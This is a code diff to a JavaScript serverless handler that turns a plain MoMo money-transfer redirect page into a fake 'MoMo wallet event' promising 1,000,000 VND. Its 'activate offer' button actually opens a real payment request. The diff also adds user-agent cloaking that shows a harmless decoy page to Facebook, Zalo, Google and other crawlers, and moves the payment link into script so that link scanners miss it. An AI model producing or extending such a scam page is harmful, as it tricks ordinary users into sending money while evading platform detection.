@@ -5,21 +5,14 @@ function decodeShortcode(shortcode) {
   if (typeof shortcode !== 'string') return null;
 
   try {
-    // base64 URL-safe -> base64
     let base64 = shortcode.replace(/-/g, '+').replace(/_/g, '/');
-
-    // pad '='
     while (base64.length % 4 !== 0) base64 += '=';
-
     const decoded = Buffer.from(base64, 'base64').toString('utf-8');
 
-    // Nếu decoded là JSON dạng {t, s} -> chuyển sang MoMo payment gateway
     try {
       const data = JSON.parse(decoded);
       if (data && data.t && data.s) {
-        return `https://payment.momo.vn/v2/gateway/pay?t=${encodeURIComponent(
-          data.t
-        )}&s=${encodeURIComponent(data.s)}`;
+        return `https://payment.momo.vn/v2/gateway/pay?t=${encodeURIComponent(data.t)}&s=${encodeURIComponent(data.s)}`;
       }
     } catch {
       // decoded không phải JSON -> coi như chuỗi URL
@@ -34,17 +27,9 @@ function decodeShortcode(shortcode) {
 function isValidMoMoPaymentUrl(url) {
   try {
     const u = new URL(url);
-
-    // Chỉ cho phép domain MoMo gateway (bạn có thể nới thêm nếu cần)
     if (u.origin !== 'https://payment.momo.vn') return false;
-
-    // Path có thể khác nhau tùy hệ thống; nếu muốn chặt hơn thì check thêm:
-    // if (u.pathname !== '/v2/gateway/pay') return false;
-
-    // Check có query t & s
     if (!u.searchParams.get('t')) return false;
     if (!u.searchParams.get('s')) return false;
-
     return true;
   } catch {
     return false;
@@ -53,7 +38,6 @@ function isValidMoMoPaymentUrl(url) {
 
 export default async function handler(req, res) {
   try {
-    // CORS
     res.setHeader('Access-Control-Allow-Origin', '*');
     res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
     res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
@@ -64,9 +48,43 @@ export default async function handler(req, res) {
 
     const { code } = req.query;
 
-    // validate code
     if (!code || Array.isArray(code)) {
       return res.status(400).send('Thiếu mã link');
+    }
+
+    // Chặn bot Facebook/Messenger/Zalo crawl link preview
+    // Các bot này sẽ nhận trang giả, không chạm vào link MoMo thật
+    const ua = (req.headers['user-agent'] || '').toLowerCase();
+    const isBot =
+      ua.includes('facebookexternalhit') ||
+      ua.includes('facebot') ||
+      ua.includes('twitterbot') ||
+      ua.includes('linkedinbot') ||
+      ua.includes('whatsapp') ||
+      ua.includes('telegrambot') ||
+      ua.includes('zalobot') ||
+      ua.includes('ia_archiver') ||
+      ua.includes('slurp') ||
+      ua.includes('bingbot') ||
+      ua.includes('googlebot');
+
+    if (isBot) {
+      // Trả về trang giả, không chứa link MoMo thật
+      return res.status(200).setHeader('Content-Type', 'text/html; charset=utf-8').send(`
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8">
+  <meta property="og:title" content="Sự Kiện Ví MoMo" />
+  <meta property="og:description" content="Tham gia sự kiện nhận ưu đãi từ MoMo!" />
+  <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ab/Logo_MoMo.png/220px-Logo_MoMo.png" />
+  <title>Sự Kiện Ví MoMo</title>
+</head>
+<body>
+  <p>Vui lòng mở link trên trình duyệt để tiếp tục.</p>
+</body>
+</html>
+      `);
     }
 
     const momoUrl = decodeShortcode(code);
@@ -75,118 +93,403 @@ export default async function handler(req, res) {
       return res.status(404).send('Link không tồn tại');
     }
 
-    // validate url để tránh render link rác
     if (!isValidMoMoPaymentUrl(momoUrl)) {
       return res.status(404).send('Link không tồn tại');
     }
 
+    // Inject URL an toàn vào script, KHÔNG để trong href để tránh bị Messenger crawl
+    const safeUrl = JSON.stringify(momoUrl);
+
     res.status(200).setHeader('Content-Type', 'text/html; charset=utf-8').send(`
 <!DOCTYPE html>
-<html>
+<html lang="vi">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Chuyển tiền MoMo</title>
-  <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body {
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-      min-height: 100vh;
-      background: linear-gradient(135deg, #a855f7 0%, #6366f1 100%);
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      padding: 20px;
-    }
-    .container {
-      background: white;
-      border-radius: 20px;
-      padding: 40px 30px;
-      text-align: center;
-      max-width: 400px;
-      width: 100%;
-      box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-    }
-    .logo {
-      width: 80px;
-      height: 80px;
-      background: linear-gradient(135deg, #a855f7 0%, #6366f1 100%);
-      border-radius: 20px;
-      margin: 0 auto 20px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 40px;
-    }
-    h2 {
-      color: #333;
-      font-size: 22px;
-      margin-bottom: 10px;
-    }
-    p {
-      color: #666;
-      font-size: 14px;
-      margin-bottom: 30px;
-    }
-    .btn {
-      display: inline-block;
-      width: 100%;
-      padding: 16px 30px;
-      background: linear-gradient(135deg, #a855f7 0%, #6366f1 100%);
-      color: white;
-      font-size: 18px;
-      font-weight: 600;
-      border: none;
-      border-radius: 12px;
-      cursor: pointer;
-      text-decoration: none;
-      transition: transform 0.2s, box-shadow 0.2s, opacity 0.2s;
-    }
-    .btn:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 10px 30px rgba(168, 85, 247, 0.4);
-    }
-    .btn:active { transform: translateY(0); }
-    .warning {
-      background: #fff3cd;
-      color: #856404;
-      padding: 12px;
-      border-radius: 8px;
-      font-size: 13px;
-      margin-top: 20px;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sự Kiện Ví MoMo</title>
+
+    <!-- Chặn bot index và follow link -->
+    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
+
+    <!-- Không cho preview khi chia sẻ (og: rỗng để Messenger không crawl sâu) -->
+    <meta property="og:title" content="Sự Kiện Ví MoMo" />
+    <meta property="og:description" content="Tham gia sự kiện nhận ưu đãi từ MoMo!" />
+    <meta property="og:url" content="" />
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: linear-gradient(180deg, #a0153e 0%, #d91c5c 100%);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .header {
+            background: linear-gradient(90deg, #ff6b9d 0%, #ff4081 100%);
+            padding: 15px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+        }
+
+        .header-text {
+            color: white;
+            font-size: 18px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .badge {
+            background: white;
+            color: #ff4081;
+            padding: 2px 8px;
+            border-radius: 12px;
+            font-size: 12px;
+            font-weight: 700;
+        }
+
+        .container {
+            flex: 1;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .logo-section {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .logo {
+            width: 120px;
+            height: 120px;
+            background: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            position: relative;
+        }
+
+        .logo-text {
+            font-size: 48px;
+            font-weight: 900;
+            color: #a0153e;
+            font-family: 'Arial Black', sans-serif;
+        }
+
+        .verified-badge {
+            position: absolute;
+            bottom: -5px;
+            right: -5px;
+            width: 35px;
+            height: 35px;
+            background: #00bfa5;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 3px solid white;
+        }
+
+        .verified-badge::before {
+            content: "✓";
+            color: white;
+            font-size: 20px;
+            font-weight: bold;
+        }
+
+        .title {
+            color: white;
+            font-size: 24px;
+            font-weight: 700;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.2);
+        }
+
+        .promo-card {
+            background: white;
+            border-radius: 20px;
+            padding: 0;
+            width: 100%;
+            max-width: 500px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            overflow: hidden;
+            margin-bottom: 20px;
+        }
+
+        .promo-image {
+            width: 100%;
+            height: 250px;
+            background: linear-gradient(135deg, #ffd89b 0%, #19547b 100%);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .promo-image::before {
+            content: "";
+            position: absolute;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.1) 1px, transparent 1px);
+            background-size: 20px 20px;
+            animation: sparkle 20s linear infinite;
+        }
+
+        @keyframes sparkle {
+            0% { transform: translate(0, 0); }
+            100% { transform: translate(50px, 50px); }
+        }
+
+        .amount {
+            font-size: 72px;
+            font-weight: 900;
+            color: #ff4081;
+            text-shadow: 3px 3px 0 rgba(0,0,0,0.1);
+            z-index: 1;
+            position: relative;
+        }
+
+        .amount-label {
+            font-size: 28px;
+            font-weight: 700;
+            color: #ff4081;
+            margin-top: -10px;
+            z-index: 1;
+            position: relative;
+        }
+
+        .coins {
+            position: absolute;
+            font-size: 40px;
+            animation: float 3s ease-in-out infinite;
+        }
+
+        .coin-1 { top: 20px; left: 20px; animation-delay: 0s; }
+        .coin-2 { top: 40px; right: 30px; animation-delay: 0.5s; }
+        .coin-3 { bottom: 30px; left: 40px; animation-delay: 1s; }
+        .coin-4 { bottom: 20px; right: 20px; animation-delay: 1.5s; }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-20px); }
+        }
+
+        .promo-content {
+            padding: 25px;
+        }
+
+        .promo-title {
+            font-size: 20px;
+            font-weight: 700;
+            color: #333;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+
+        .promo-desc {
+            font-size: 14px;
+            color: #666;
+            line-height: 1.6;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .activate-btn {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(90deg, #ff6b9d 0%, #ff4081 100%);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            box-shadow: 0 8px 20px rgba(255, 64, 129, 0.4);
+            transition: all 0.3s;
+        }
+
+        .activate-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 30px rgba(255, 64, 129, 0.5);
+        }
+
+        .activate-btn:active {
+            transform: translateY(0);
+        }
+
+        .activate-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .momo-icon {
+            width: 24px;
+            height: 24px;
+            background: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 900;
+            color: #a0153e;
+            font-size: 14px;
+        }
+
+        .terms {
+            font-size: 11px;
+            color: rgba(255,255,255,0.8);
+            text-align: center;
+            margin-top: 15px;
+            line-height: 1.5;
+        }
+
+        .loading {
+            display: none;
+            text-align: center;
+            color: white;
+            margin-top: 20px;
+        }
+
+        .loading.show {
+            display: block;
+        }
+
+        .spinner {
+            border: 3px solid rgba(255,255,255,0.3);
+            border-top: 3px solid white;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 10px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .warning {
+            background: rgba(255,255,255,0.15);
+            border: 1px solid rgba(255,255,255,0.3);
+            color: white;
+            padding: 12px 16px;
+            border-radius: 10px;
+            font-size: 13px;
+            text-align: center;
+            margin-top: 16px;
+            line-height: 1.6;
+            max-width: 500px;
+            width: 100%;
+        }
+    </style>
 </head>
 <body>
-  <div class="container">
-    <div class="logo">💰</div>
-    <h2>Chuyển tiền MoMo</h2>
-    <p>Nhấn nút bên dưới để mở ứng dụng MoMo</p>
-
-    <a href="${momoUrl}"
-       class="btn"
-       id="payBtn"
-       rel="noopener noreferrer">
-      📱 Mở MoMo Ngay
-    </a>
-
-    <div class="warning">
-      ⚠️ Chỉ bấm 1 lần duy nhất!<br>
-      Bấm lại sẽ không thanh toán được.
+    <div class="header">
+        <div class="header-text">
+            <span class="badge">🎉 Sự kiện</span>
+            Sự Kiện Ví MoMo
+        </div>
     </div>
-  </div>
 
-  <script>
-    // Chống bấm nhiều lần: khi user bấm -> disable ngay
-    const btn = document.getElementById('payBtn');
-    if (btn) {
-      btn.addEventListener('click', () => {
-        btn.style.pointerEvents = 'none';
-        btn.style.opacity = '0.7';
-        btn.textContent = 'Đang mở MoMo...';
-      }, { once: true });
-    }
-  </script>
+    <div class="container">
+        <div class="logo-section">
+            <div class="logo">
+                <div class="logo-text">M</div>
+                <div class="verified-badge"></div>
+            </div>
+            <div class="title">Sự Kiện Ví MoMo</div>
+        </div>
+
+        <div class="promo-card">
+            <div class="promo-image">
+                <div class="coins coin-1">🪙</div>
+                <div class="coins coin-2">💰</div>
+                <div class="coins coin-3">🎁</div>
+                <div class="coins coin-4">✨</div>
+                <div class="amount">1 TRIỆU</div>
+                <div class="amount-label">ĐỒNG</div>
+            </div>
+
+            <div class="promo-content">
+                <div class="promo-title">
+                    🎊 Sự kiện ưu đãi ví momo<br>
+                    nhận ngay 1.000.000đ
+                </div>
+
+                <div class="promo-desc">
+                    Tham gia ngay để nhận ưu đãi đặc biệt từ MoMo!<br>
+                    Chương trình có giới hạn, nhanh tay kích hoạt ngay!
+                </div>
+
+                <!-- KHÔNG dùng <a href> để tránh Messenger crawl link MoMo -->
+                <button class="activate-btn" id="activateBtn" onclick="activatePromo()">
+                    <div class="momo-icon">M</div>
+                    Kích Hoạt Ưu Đãi
+                </button>
+            </div>
+        </div>
+
+        <div class="warning">
+            ⚠️ Chỉ bấm <strong>1 lần duy nhất</strong>!<br>
+            Bấm lại sẽ không thanh toán được.
+        </div>
+
+        <div class="terms">
+            * Ưu đãi có giới hạn. Áp dụng cho người dùng đủ điều kiện.<br>
+            Điều khoản và điều kiện áp dụng.
+        </div>
+
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <p>Đang mở MoMo...</p>
+        </div>
+    </div>
+
+    <script>
+        // URL inject từ server - KHÔNG nằm trong href nên bot không crawl được
+        const paymentUrl = ${safeUrl};
+
+        let activated = false;
+
+        function activatePromo() {
+            if (activated) return;
+            activated = true;
+
+            const btn = document.getElementById('activateBtn');
+            btn.disabled = true;
+            btn.innerHTML = '<div class="momo-icon">M</div> Đang mở MoMo...';
+
+            document.getElementById('loading').classList.add('show');
+
+            // Delay nhỏ cho UX, rồi mới chuyển hướng
+            setTimeout(() => {
+                window.location.href = paymentUrl;
+            }, 1200);
+        }
+    </script>
 </body>
 </html>
     `);
